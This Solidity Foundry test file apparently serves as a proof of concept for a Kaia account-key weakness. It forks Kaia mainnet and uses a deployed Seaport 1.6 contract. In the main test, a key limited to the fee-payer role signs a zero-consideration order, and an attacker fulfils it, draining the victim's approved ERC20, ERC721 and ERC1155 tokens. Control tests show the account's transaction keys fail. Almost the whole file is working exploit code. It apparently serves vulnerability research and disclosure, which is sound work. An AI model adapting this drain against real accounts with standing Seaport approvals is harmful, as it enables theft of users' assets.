// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

enum ItemType {
    NATIVE,
    ERC20,
    ERC721,
    ERC1155,
    ERC721_WITH_CRITERIA,
    ERC1155_WITH_CRITERIA
}

enum OrderType {
    FULL_OPEN,
    PARTIAL_OPEN,
    FULL_RESTRICTED,
    PARTIAL_RESTRICTED,
    CONTRACT
}

struct OfferItem {
    ItemType itemType;
    address token;
    uint256 identifierOrCriteria;
    uint256 startAmount;
    uint256 endAmount;
}

struct ConsiderationItem {
    ItemType itemType;
    address token;
    uint256 identifierOrCriteria;
    uint256 startAmount;
    uint256 endAmount;
    address payable recipient;
}

struct OrderParameters {
    address offerer;
    address zone;
    OfferItem[] offer;
    ConsiderationItem[] consideration;
    OrderType orderType;
    uint256 startTime;
    uint256 endTime;
    bytes32 zoneHash;
    uint256 salt;
    bytes32 conduitKey;
    uint256 totalOriginalConsiderationItems;
}

struct OrderComponents {
    address offerer;
    address zone;
    OfferItem[] offer;
    ConsiderationItem[] consideration;
    OrderType orderType;
    uint256 startTime;
    uint256 endTime;
    bytes32 zoneHash;
    uint256 salt;
    bytes32 conduitKey;
    uint256 counter;
}

struct Order {
    OrderParameters parameters;
    bytes signature;
}

interface ISeaport {
    function fulfillOrder(Order calldata order, bytes32 fulfillerConduitKey)
        external
        payable
        returns (bool fulfilled);

    function getOrderHash(OrderComponents calldata order)
        external
        view
        returns (bytes32 orderHash);

    function getOrderStatus(bytes32 orderHash)
        external
        view
        returns (
            bool isValidated,
            bool isCancelled,
            uint256 totalFilled,
            uint256 totalSize
        );

    function getCounter(address offerer) external view returns (uint256 counter);

    function information()
        external
        view
        returns (
            string memory version,
            bytes32 domainSeparator,
            address conduitController
        );
}

contract ControlledERC20 {
    string public constant name = "Controlled20";
    string public constant symbol = "C20";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount)
        external
        returns (bool)
    {
        uint256 permitted = allowance[from][msg.sender];
        require(permitted >= amount, "ERC20_ALLOWANCE");
        require(balanceOf[from] >= amount, "ERC20_BALANCE");
        if (permitted != type(uint256).max) {
            allowance[from][msg.sender] = permitted - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract ControlledERC721 {
    string public constant name = "Controlled721";
    string public constant symbol = "C721";
    mapping(uint256 => address) internal owners;
    mapping(address => mapping(address => bool)) public isApprovedForAll;
    mapping(uint256 => address) public getApproved;

    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    function mint(address to, uint256 id) external {
        require(owners[id] == address(0), "ERC721_EXISTS");
        owners[id] = to;
        emit Transfer(address(0), to, id);
    }

    function ownerOf(uint256 id) external view returns (address) {
        address owner = owners[id];
        require(owner != address(0), "ERC721_MISSING");
        return owner;
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(owners[id] == from, "ERC721_OWNER");
        require(
            msg.sender == from || isApprovedForAll[from][msg.sender]
                || getApproved[id] == msg.sender,
            "ERC721_AUTH"
        );
        require(to != address(0), "ERC721_ZERO");
        owners[id] = to;
        delete getApproved[id];
        emit Transfer(from, to, id);
    }
}

contract ControlledERC1155 {
    mapping(uint256 => mapping(address => uint256)) internal balances;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    event TransferSingle(
        address indexed operator,
        address indexed from,
        address indexed to,
        uint256 id,
        uint256 value
    );
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    function mint(address to, uint256 id, uint256 amount) external {
        balances[id][to] += amount;
        emit TransferSingle(msg.sender, address(0), to, id, amount);
    }

    function balanceOf(address owner, uint256 id) external view returns (uint256) {
        return balances[id][owner];
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata
    ) external {
        require(msg.sender == from || isApprovedForAll[from][msg.sender], "ERC1155_AUTH");
        require(balances[id][from] >= amount, "ERC1155_BALANCE");
        require(to != address(0), "ERC1155_ZERO");
        balances[id][from] -= amount;
        balances[id][to] += amount;
        emit TransferSingle(msg.sender, from, to, id, amount);
    }
}

contract KaiaRoleCollapseTest is Test {
    address internal constant SEAPORT =
        0x0000000000000068F116a894984e2DB1123eB395;

    // The address derived from this key is the controlled Kaia account. In the
    // companion Kaia-native test the same key is installed only as
    // RoleFeePayer, while RoleTransaction is AccountKeyFail or threshold-2.
    uint256 internal constant FEE_PAYER_ONLY_PK = 0xA11CE;
    uint256 internal constant TRANSACTION_KEY_1_PK = 0xB0B01;
    uint256 internal constant TRANSACTION_KEY_2_PK = 0xB0B02;
    uint256 internal constant ATTACKER_PK = 0xBADCA11;

    uint256 internal constant ERC20_AMOUNT = 100 ether;
    uint256 internal constant ERC721_ID = 721;
    uint256 internal constant ERC1155_ID = 1155;
    uint256 internal constant ERC1155_AMOUNT = 7;

    ISeaport internal seaport = ISeaport(SEAPORT);
    ControlledERC20 internal token20;
    ControlledERC721 internal token721;
    ControlledERC1155 internal token1155;
    address internal victim;
    address internal attacker;
    bytes32 internal expectedCodeHash;

    event AuthorizationDelta(
        address indexed victim,
        address indexed attacker,
        bytes32 indexed orderHash,
        bytes32 digest,
        bytes32 seaportCodeHash,
        uint256 erc20Before,
        uint256 erc20After,
        address erc721Before,
        address erc721After,
        uint256 erc1155Before,
        uint256 erc1155After
    );

    function setUp() public {
        string memory rpc = vm.envString("KAIA_RPC_URL");
        uint256 forkBlock = vm.envUint("KAIA_FORK_BLOCK");
        vm.createSelectFork(rpc, forkBlock);

        assertEq(block.chainid, 8217, "WRONG_CHAIN");
        expectedCodeHash = vm.envBytes32("SEAPORT_CODEHASH");
        assertEq(SEAPORT.codehash, expectedCodeHash, "WRONG_SEAPORT_RUNTIME");
        assertGt(SEAPORT.code.length, 0, "SEAPORT_NOT_DEPLOYED");

        (string memory version,,) = seaport.information();
        assertEq(keccak256(bytes(version)), keccak256(bytes("1.6")), "WRONG_VERSION");

        victim = vm.addr(FEE_PAYER_ONLY_PK);
        attacker = vm.addr(ATTACKER_PK);
        vm.label(victim, "kaia_role_based_victim");
        vm.label(attacker, "attacker_fulfiller");

        token20 = new ControlledERC20();
        token721 = new ControlledERC721();
        token1155 = new ControlledERC1155();

        token20.mint(victim, ERC20_AMOUNT);
        token721.mint(victim, ERC721_ID);
        token1155.mint(victim, ERC1155_ID, ERC1155_AMOUNT);

        // Laboratory setup representing approvals created before the account
        // installed its stricter role-based key policy.
        vm.startPrank(victim);
        token20.approve(SEAPORT, type(uint256).max);
        token721.setApprovalForAll(SEAPORT, true);
        token1155.setApprovalForAll(SEAPORT, true);
        vm.stopPrank();
    }

    function testRoleFeePayerOnlyKeyDrainsAllApprovedAssetClasses() public {
        OrderComponents memory c = _components(0xFEE0);
        Order memory order = _signedOrder(c, FEE_PAYER_ONLY_PK);
        bytes32 orderHash = seaport.getOrderHash(c);
        (, bytes32 domainSeparator,) = seaport.information();
        bytes32 digest = keccak256(abi.encodePacked(bytes2(0x1901), domainSeparator, orderHash));

        assertEq(_recover(digest, order.signature), victim, "SIGNER_NOT_VICTIM_ADDRESS");

        (bool validated0, bool cancelled0, uint256 filled0, uint256 size0) =
            seaport.getOrderStatus(orderHash);
        assertFalse(validated0, "UNEXPECTED_PREVALIDATION");
        assertFalse(cancelled0, "UNEXPECTED_PRECANCEL");
        assertEq(filled0, 0, "UNEXPECTED_PREFILL");
        assertEq(size0, 0, "UNEXPECTED_PRESIZE");

        uint256 erc20Before = token20.balanceOf(victim);
        address erc721Before = token721.ownerOf(ERC721_ID);
        uint256 erc1155Before = token1155.balanceOf(victim, ERC1155_ID);

        vm.prank(attacker);
        assertTrue(seaport.fulfillOrder(order, bytes32(0)), "FULFILL_FAILED");

        uint256 erc20After = token20.balanceOf(victim);
        address erc721After = token721.ownerOf(ERC721_ID);
        uint256 erc1155After = token1155.balanceOf(victim, ERC1155_ID);

        assertEq(erc20Before, ERC20_AMOUNT, "BAD_ERC20_PREBALANCE");
        assertEq(erc20After, 0, "ERC20_NOT_DRAINED");
        assertEq(token20.balanceOf(attacker), ERC20_AMOUNT, "ATTACKER_ERC20_DELTA");
        assertEq(erc721Before, victim, "BAD_ERC721_PREOWNER");
        assertEq(erc721After, attacker, "ERC721_NOT_DRAINED");
        assertEq(erc1155Before, ERC1155_AMOUNT, "BAD_ERC1155_PREBALANCE");
        assertEq(erc1155After, 0, "ERC1155_NOT_DRAINED");
        assertEq(
            token1155.balanceOf(attacker, ERC1155_ID),
            ERC1155_AMOUNT,
            "ATTACKER_ERC1155_DELTA"
        );

        (bool validated1, bool cancelled1, uint256 filled1, uint256 size1) =
            seaport.getOrderStatus(orderHash);
        assertTrue(validated1, "ORDER_NOT_VALIDATED");
        assertFalse(cancelled1, "ORDER_CANCELLED");
        assertEq(filled1, 1, "WRONG_FINAL_NUMERATOR");
        assertEq(size1, 1, "WRONG_FINAL_DENOMINATOR");

        emit AuthorizationDelta(
            victim,
            attacker,
            orderHash,
            digest,
            SEAPORT.codehash,
            erc20Before,
            erc20After,
            erc721Before,
            erc721After,
            erc1155Before,
            erc1155After
        );

        console2.log("KAIA_ROLE_COLLAPSE_WITNESS");
        console2.log("chainId", block.chainid);
        console2.log("forkBlock", block.number);
        console2.log("victim", victim);
        console2.log("attacker", attacker);
        console2.logBytes32(orderHash);
        console2.logBytes32(digest);
        console2.logBytes32(SEAPORT.codehash);
    }

    function testCurrentRoleTransactionKeyCannotSignForLegacyAddress() public {
        OrderComponents memory c = _components(0xFEE1);
        Order memory order = _signedOrder(c, TRANSACTION_KEY_1_PK);
        bytes32 orderHash = seaport.getOrderHash(c);
        (, bytes32 domainSeparator,) = seaport.information();
        bytes32 digest = keccak256(abi.encodePacked(bytes2(0x1901), domainSeparator, orderHash));

        assertTrue(
            _recover(digest, order.signature) != victim,
            "DECOUPLED_KEY_UNEXPECTEDLY_DERIVES_VICTIM"
        );

        vm.prank(attacker);
        vm.expectRevert();
        seaport.fulfillOrder(order, bytes32(0));

        assertEq(token20.balanceOf(victim), ERC20_AMOUNT, "CONTROL_ERC20_CHANGED");
        assertEq(token721.ownerOf(ERC721_ID), victim, "CONTROL_ERC721_CHANGED");
        assertEq(
            token1155.balanceOf(victim, ERC1155_ID),
            ERC1155_AMOUNT,
            "CONTROL_ERC1155_CHANGED"
        );
        (bool validated, bool cancelled, uint256 filled, uint256 size) =
            seaport.getOrderStatus(orderHash);
        assertFalse(validated, "CONTROL_VALIDATED");
        assertFalse(cancelled, "CONTROL_CANCELLED");
        assertEq(filled, 0, "CONTROL_FILLED");
        assertEq(size, 0, "CONTROL_SIZE");
    }

    function testSecondTransactionKeyAlsoCannotSignForLegacyAddress() public {
        OrderComponents memory c = _components(0xFEE2);
        Order memory order = _signedOrder(c, TRANSACTION_KEY_2_PK);

        vm.prank(attacker);
        vm.expectRevert();
        seaport.fulfillOrder(order, bytes32(0));

        assertEq(token20.balanceOf(victim), ERC20_AMOUNT, "CONTROL2_ERC20_CHANGED");
        assertEq(token721.ownerOf(ERC721_ID), victim, "CONTROL2_ERC721_CHANGED");
        assertEq(
            token1155.balanceOf(victim, ERC1155_ID),
            ERC1155_AMOUNT,
            "CONTROL2_ERC1155_CHANGED"
        );
    }

    function _components(uint256 salt)
        internal
        view
        returns (OrderComponents memory c)
    {
        OfferItem[] memory offer = new OfferItem[](3);
        offer[0] = OfferItem({
            itemType: ItemType.ERC20,
            token: address(token20),
            identifierOrCriteria: 0,
            startAmount: ERC20_AMOUNT,
            endAmount: ERC20_AMOUNT
        });
        offer[1] = OfferItem({
            itemType: ItemType.ERC721,
            token: address(token721),
            identifierOrCriteria: ERC721_ID,
            startAmount: 1,
            endAmount: 1
        });
        offer[2] = OfferItem({
            itemType: ItemType.ERC1155,
            token: address(token1155),
            identifierOrCriteria: ERC1155_ID,
            startAmount: ERC1155_AMOUNT,
            endAmount: ERC1155_AMOUNT
        });

        ConsiderationItem[] memory consideration = new ConsiderationItem[](0);
        c = OrderComponents({
            offerer: victim,
            zone: address(0),
            offer: offer,
            consideration: consideration,
            orderType: OrderType.FULL_OPEN,
            startTime: block.timestamp - 1,
            endTime: block.timestamp + 7 days,
            zoneHash: bytes32(0),
            salt: salt,
            conduitKey: bytes32(0),
            counter: seaport.getCounter(victim)
        });
    }

    function _signedOrder(OrderComponents memory c, uint256 privateKey)
        internal
        view
        returns (Order memory order)
    {
        bytes32 orderHash = seaport.getOrderHash(c);
        (, bytes32 domainSeparator,) = seaport.information();
        bytes32 digest = keccak256(abi.encodePacked(bytes2(0x1901), domainSeparator, orderHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);

        order = Order({
            parameters: OrderParameters({
                offerer: c.offerer,
                zone: c.zone,
                offer: c.offer,
                consideration: c.consideration,
                orderType: c.orderType,
                startTime: c.startTime,
                endTime: c.endTime,
                zoneHash: c.zoneHash,
                salt: c.salt,
                conduitKey: c.conduitKey,
                totalOriginalConsiderationItems: c.consideration.length
            }),
            signature: abi.encodePacked(r, s, v)
        });
    }

    function _recover(bytes32 digest, bytes memory signature)
        internal
        pure
        returns (address recovered)
    {
        require(signature.length == 65, "BAD_SIG_LEN");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
        recovered = ecrecover(digest, v, r, s);
    }
}
